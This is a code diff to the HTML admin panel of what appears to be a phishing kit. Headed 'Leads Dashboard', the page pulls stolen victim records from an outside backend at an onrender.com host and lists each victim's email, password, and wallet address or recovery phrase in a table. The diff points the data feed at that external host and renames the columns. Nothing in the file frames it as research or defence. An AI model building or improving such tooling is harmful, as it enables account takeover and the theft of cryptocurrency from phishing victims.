@@ -1,30 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leads</title>
+    <title>Admin</title>
     <style>
-        body { font-family: sans-serif; background: #f4f7f9; padding: 20px; }
-        table { width: 100%; border-collapse: collapse; background: white; }
-        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
+        body { font-family: sans-serif; background: #f0f2f5; padding: 30px; }
+        table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
         th { background: #0052ff; color: white; }
+        h1 { color: #333; }
     </style>
 </head>
 <body>
-    <h1>Collected Leads</h1>
+    <h1>Leads Dashboard</h1>
     <table>
         <thead>
-            <tr><th>Email</th><th>Pass</th><th>Wallet/Phrase</th><th>Date</th></tr>
+            <tr><th>Email</th><th>Password</th><th>Recovery/Wallet</th><th>Time</th></tr>
         </thead>
-        <tbody id="leads"></tbody>
+        <tbody id="list"></tbody>
     </table>
     <script>
         async function load() {
-            const res = await fetch('/dashboard');
+            const res = await fetch('https://cb-backend-new.onrender.com/dashboard-data');
             const data = await res.json();
-            const body = document.getElementById('leads');
+            const body = document.getElementById('list');
             data.forEach(l => {
                 body.innerHTML += `<tr>
-                    <td>${l.email}</td><td>${l.password}</td>
+                    <td>${l.email}</td>
+                    <td>${l.password}</td>
                     <td>${l.walletAddress || l.recoveryPhrase}</td>
                     <td>${new Date(l.timestamp).toLocaleString()}</td>
                 </tr>`;
